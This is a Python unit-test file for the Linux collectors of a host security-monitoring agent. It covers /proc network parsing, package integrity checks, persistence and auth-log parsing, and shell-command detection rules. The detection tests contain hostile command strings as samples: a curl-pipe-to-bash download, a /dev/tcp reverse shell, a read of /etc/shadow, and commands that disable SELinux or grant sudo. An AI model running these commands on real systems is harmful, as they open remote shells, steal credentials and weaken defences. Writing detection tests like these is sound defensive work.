"""Unit tests for the Linux core collectors' pure parsing logic.

These exercise the /proc and dpkg parsers with synthetic fixtures so they can run on
any platform (no live /proc or dpkg required) — useful while porting from macOS.

    python3 -m unittest discover -s tests
"""
import hashlib
import os
import shutil
import sys
import tempfile
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import agent  # noqa: E402


class HexAddrTests(unittest.TestCase):
    def test_ipv4_little_endian(self):
        self.assertEqual(agent._hex_to_ip("0100007F"), "127.0.0.1")
        self.assertEqual(agent._hex_to_ip("0101A8C0"), "192.168.1.1")

    def test_ipv6_loopback(self):
        self.assertEqual(agent._hex_to_ip("00000000000000000000000001000000"), "::1")

    def test_bad_input(self):
        self.assertEqual(agent._hex_to_ip("ZZ"), "")


class ProcNetTests(unittest.TestCase):
    HEADER = ("  sl  local_address rem_address   st tx_queue rx_queue tr tm->when "
              "retrnsmt   uid  timeout inode\n")

    def _write(self, body):
        fd, path = tempfile.mkstemp()
        with os.fdopen(fd, "w") as fh:
            fh.write(self.HEADER + body)
        self.addCleanup(os.unlink, path)
        return path

    def test_listener_normalized(self):
        # 127.0.0.1:8080 LISTEN (state 0A), no remote peer.
        line = ("   0: 0100007F:1F90 00000000:0000 0A 00000000:00000000 00:00000000 "
                "00000000  1000        0 4242 1 0000 0\n")
        path = self._write(line)
        recs = list(agent._parse_proc_net(path, "TCP"))
        self.assertEqual(len(recs), 1)
        inode, rec = recs[0]
        self.assertEqual(inode, "4242")
        self.assertEqual(rec["laddr"], "127.0.0.1")
        self.assertEqual(rec["lport"], "8080")
        self.assertEqual(rec["raddr"], "")   # zero remote collapsed
        self.assertEqual(rec["rport"], "")
        self.assertEqual(rec["state"], "LISTEN")

    def test_established_outbound(self):
        # local 192.168.1.1:48000 -> remote 1.1.1.1:443 ESTABLISHED (state 01).
        line = ("   1: 0101A8C0:BB80 01010101:01BB 01 00000000:00000000 00:00000000 "
                "00000000  1000        0 4343 1 0000 0\n")
        path = self._write(line)
        inode, rec = next(iter(agent._parse_proc_net(path, "TCP")))
        self.assertEqual(rec["raddr"], "1.1.1.1")
        self.assertEqual(rec["rport"], "443")
        self.assertEqual(rec["state"], "ESTABLISHED")

    def test_udp_has_no_state(self):
        line = ("   0: 0100007F:14E9 00000000:0000 07 00000000:00000000 00:00000000 "
                "00000000  1000        0 4444 1 0000 0\n")
        path = self._write(line)
        _, rec = next(iter(agent._parse_proc_net(path, "UDP")))
        self.assertEqual(rec["state"], "")


class EtimeTests(unittest.TestCase):
    def test_formats(self):
        self.assertEqual(agent._fmt_etime(5), "00:05")
        self.assertEqual(agent._fmt_etime(65), "01:05")
        self.assertEqual(agent._fmt_etime(3661), "01:01:01")
        self.assertEqual(agent._fmt_etime(90061), "1-01:01:01")


class DpkgSignatureTests(unittest.TestCase):
    def setUp(self):
        self.root = tempfile.mkdtemp()
        self.addCleanup(_rmtree, self.root)
        self.info = os.path.join(self.root, "info")
        os.makedirs(self.info)
        # a "packaged" binary on disk
        self.binpath = os.path.join(self.root, "usr", "bin", "foo")
        os.makedirs(os.path.dirname(self.binpath))
        with open(self.binpath, "wb") as fh:
            fh.write(b"ELF-ish bytes for foo\n")
        with open(self.binpath, "rb") as fh:
            self.md5 = hashlib.md5(fh.read()).hexdigest()
        rel = self.binpath.lstrip("/")
        with open(os.path.join(self.info, "foo.list"), "w") as fh:
            fh.write(self.binpath + "\n")
        with open(os.path.join(self.info, "foo.md5sums"), "w") as fh:
            fh.write(f"{self.md5}  {rel}\n")

    def _checker(self):
        sc = agent.SignatureChecker(enabled=True)
        sc.dpkg.INFO_DIR = self.info     # point the index at the fixture
        return sc

    def test_packaged_verified(self):
        res = self._checker()._classify(self.binpath)
        self.assertEqual(res["category"], "packaged")
        self.assertTrue(res["trusted"])

    def test_modified_detected(self):
        with open(self.binpath, "ab") as fh:
            fh.write(b"tampered")
        res = self._checker()._classify(self.binpath)
        self.assertEqual(res["category"], "modified")
        self.assertFalse(res["trusted"])

    def test_unpackaged(self):
        other = os.path.join(self.root, "usr", "local", "bin", "bar")
        os.makedirs(os.path.dirname(other))
        with open(other, "w") as fh:
            fh.write("x")
        res = self._checker()._classify(other)
        self.assertEqual(res["category"], "unpackaged")

    def test_missing(self):
        res = self._checker()._classify(os.path.join(self.root, "nope"))
        self.assertEqual(res["category"], "missing")


class PersistenceParserTests(unittest.TestCase):
    def test_desktop_entry(self):
        body = ("[Desktop Entry]\nType=Application\nName=Updater\n"
                "Exec=/tmp/.x/run --daemon %U\nHidden=false\n")
        e = agent.parse_desktop_entry(body)
        self.assertEqual(e["name"], "Updater")
        self.assertEqual(e["exec"], "/tmp/.x/run --daemon %U")
        self.assertFalse(e["hidden"])
        self.assertEqual(agent._desktop_exec_path(e["exec"]), "/tmp/.x/run")

    def test_desktop_hidden(self):
        self.assertTrue(agent.parse_desktop_entry("Hidden=true\n")["hidden"])

    def test_ld_preload(self):
        self.assertEqual(agent.parse_ld_preload("# c\n/usr/lib/evil.so\n/lib/x.so\n"),
                         ["/usr/lib/evil.so", "/lib/x.so"])

    def test_exec_prefix_strip(self):
        self.assertEqual(agent._strip_exec_prefix("@-/usr/bin/foo"), "/usr/bin/foo")
        self.assertEqual(agent._strip_exec_prefix("+/bin/bar"), "/bin/bar")

    def test_parse_systemd_unit(self):
        fd, path = tempfile.mkstemp(suffix=".service")
        with os.fdopen(fd, "w") as fh:
            fh.write("[Unit]\nDescription=My Svc\n[Service]\n"
                     "ExecStart=\nExecStart=-/usr/bin/mysvc --flag\n"
                     "[Install]\nWantedBy=multi-user.target\n")
        self.addCleanup(os.unlink, path)
        info = agent._parse_systemd_unit(path)
        self.assertEqual(info["Description"], "My Svc")
        self.assertEqual(info["ExecStart"], "-/usr/bin/mysvc --flag")
        self.assertEqual(info["WantedBy"], "multi-user.target")

    def test_rc_suspicious_re(self):
        self.assertTrue(agent.RC_SUSPICIOUS_RE.search("curl http://x/y | bash"))
        self.assertTrue(agent.RC_SUSPICIOUS_RE.search("bash -i >& /dev/tcp/1.2.3.4/9001 0>&1"))
        self.assertFalse(agent.RC_SUSPICIOUS_RE.search("export PATH=$PATH:/usr/local/bin"))


class SshdConfigTests(unittest.TestCase):
    def test_permit_root_login_parsed(self):
        fd, path = tempfile.mkstemp()
        with os.fdopen(fd, "w") as fh:
            fh.write("# comment\nPort 22\nPermitRootLogin yes\nPasswordAuthentication no\n")
        self.addCleanup(os.unlink, path)
        orig = agent.SSHD_CONFIG
        agent.SSHD_CONFIG = path
        try:
            cfg = agent.read_sshd_config()
        finally:
            agent.SSHD_CONFIG = orig
        self.assertEqual(cfg["permitrootlogin"], "yes")
        self.assertEqual(cfg["passwordauthentication"], "no")


class AuthClassifyTests(unittest.TestCase):
    def setUp(self):
        self.ac = agent.AuthCollector(history=None, enabled=False)

    def test_sshd_accepted(self):
        ev = self.ac._classify_log("sshd", "Accepted publickey for alice from 10.0.0.5 port 4242", 1000)
        self.assertEqual(ev["etype"], "ssh")
        self.assertTrue(ev["success"])
        self.assertEqual(ev["user"], "alice")
        self.assertEqual(ev["source"], "10.0.0.5")

    def test_sshd_failed(self):
        ev = self.ac._classify_log("sshd", "Failed password for invalid user bob from 1.2.3.4 port 9", 1000)
        self.assertFalse(ev["success"])
        self.assertEqual(ev["user"], "bob")

    def test_sudo_command(self):
        ev = self.ac._classify_log("sudo", "alice : TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND=/bin/ls", 1000)
        self.assertEqual(ev["etype"], "sudo")
        self.assertTrue(ev["success"])
        self.assertEqual(ev["command"], "/bin/ls")

    def test_su_success(self):
        ev = self.ac._classify_log("su", "(to root) alice on pts/1", 1000)
        self.assertEqual(ev["etype"], "su")
        self.assertTrue(ev["success"])
        self.assertEqual(ev["user"], "root")


class AccountNodeTests(unittest.TestCase):
    def test_second_root_flagged(self):
        n = agent.AccountCollector._user_node("backdoor", 0, "/bin/bash", "/home/backdoor")
        self.assertGreaterEqual(n["score"], 90)

    def test_real_root_not_flagged_as_second(self):
        n = agent.AccountCollector._user_node("root", 0, "/bin/bash", "/root")
        self.assertLess(n["score"], 90)   # the genuine root account is not "a second uid-0"

    def test_hidden_login_shell(self):
        n = agent.AccountCollector._user_node("sneaky", 500, "/bin/bash", "/home/sneaky")
        self.assertEqual(n["detail"]["hidden"], True)
        self.assertTrue(n["detail"]["login_shell"])


class BehavioralRuleTests(unittest.TestCase):
    def test_shell_rules_linux_ttps(self):
        cases = {
            "setenforce 0": "disabling system defenses",
            "cat /etc/shadow": "reading credential stores (/etc/shadow)",
            "usermod -aG sudo eve": "granting admin / root",
            "curl http://x/y | sudo bash": "piping a download into a shell",
            "bash -i >& /dev/tcp/1.2.3.4/9001 0>&1": "reverse-shell pattern",
            "chattr +i /usr/bin/evil": "setting an immutable/setuid bit",
        }
        for cmd, expected in cases.items():
            res = agent.match_shell_rule(cmd)
            self.assertIsNotNone(res, cmd)
            self.assertEqual(res[0], expected, cmd)

    def test_shell_rules_no_macos_leftovers(self):
        blob = repr(agent.SHELL_RULES) + repr(agent.JOB_PAYLOAD_PATTERNS)
        for tok in ("csrutil", "spctl", "launchctl", "osascript", "tmutil", "com.apple", "dscl"):
            self.assertNotIn(tok, blob)

    def test_builtin_rules_all_described(self):
        self.assertTrue(all(r.get("description") for r in agent.BUILTIN_RULES))
        ids = [r["id"] for r in agent.BUILTIN_RULES]
        self.assertEqual(len(ids), len(set(ids)))   # no duplicate ids


def _rmtree(path):
    import shutil
    shutil.rmtree(path, ignore_errors=True)



class TestBreakGlassCommand(unittest.TestCase):
    """The copyable break-glass line must survive an install path with a space
    (macOS installs under /Library/Application Support/Scouter/)."""

    def test_spaced_path_is_shell_safe(self):
        import shlex
        script = "/Library/Application Support/Scouter/agent/agent.py"
        python = "/Library/Application Support/Scouter/agent/.venv/bin/python3"
        cmd = agent.breakglass_command(python=python, script=script)
        argv = shlex.split(cmd)                       # how a shell parses the copied line
        self.assertEqual(argv[0], "sudo")
        self.assertIn(python, argv)                   # the interpreter path is ONE argument
        self.assertIn(script, argv)                   # the script path is ONE argument, not split
        self.assertIn("--break-glass", argv)

    def test_plain_path_not_needlessly_quoted(self):
        cmd = agent.breakglass_command(python="python3", script="/opt/scouter/agent.py")
        self.assertIn("python3 /opt/scouter/agent.py --break-glass", cmd)


class TestUpdateChecker(unittest.TestCase):
    """The "check for updates" signal. We ship by pushing a commit that bumps __version__ on main,
    not by cutting a GitHub release for every version -- so the authoritative "latest" is the source
    __version__ on the release branch, and the release lookup is only for notes/link enrichment. The
    regression guarded here: an old release (linux-v1.0.0) must NOT make a running 1.9.0 look current."""

    def _checker(self, current, source_version, release=None):
        tmp = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, tmp, ignore_errors=True)
        uc = agent.UpdateChecker(current=current,
                                 cache_file=os.path.join(tmp, "update-check.json"))
        uc._fetch_source_version = lambda: source_version
        uc._fetch_release = lambda latest: release
        return uc

    def test_source_version_newer_than_running_reports_update(self):
        uc = self._checker("1.9.0", "1.9.1")
        uc._check()
        st = uc.status()
        self.assertEqual(st["latest"], "1.9.1")
        self.assertTrue(st["update_available"])
        self.assertTrue(st["url"])

    def test_same_version_reports_up_to_date(self):
        uc = self._checker("1.9.1", "1.9.1")
        uc._check()
        self.assertFalse(uc.status()["update_available"])

    def test_old_release_cannot_mask_newer_source(self):
        uc = self._checker("1.9.0", "1.9.1", release=None)
        uc._check()
        self.assertTrue(uc.status()["update_available"])
        self.assertEqual(uc.status()["latest"], "1.9.1")

    def test_matching_release_enriches_notes(self):
        rel = {"tag_name": "linux-v1.9.1", "name": "Scouter 1.9.1",
               "html_url": "https://example/rel", "body": "release notes here"}
        uc = self._checker("1.9.0", "1.9.1", release=rel)
        uc._check()
        st = uc.status()
        self.assertEqual(st["url"], "https://example/rel")
        self.assertEqual(st["notes"], "release notes here")

    def test_offline_probe_keeps_last_good_state(self):
        uc = self._checker("1.9.0", "1.9.1")
        uc._check()
        uc._fetch_source_version = lambda: None
        uc._fetch_release = lambda latest: None
        uc._check()
        self.assertEqual(uc.status()["latest"], "1.9.1")

    def test_parse_source_version(self):
        self.assertEqual(
            agent.UpdateChecker._parse_source_version('x\n__version__ = "2.10.3"\ny'), "2.10.3")
        self.assertIsNone(agent.UpdateChecker._parse_source_version("no version here"))


if __name__ == "__main__":
    unittest.main()
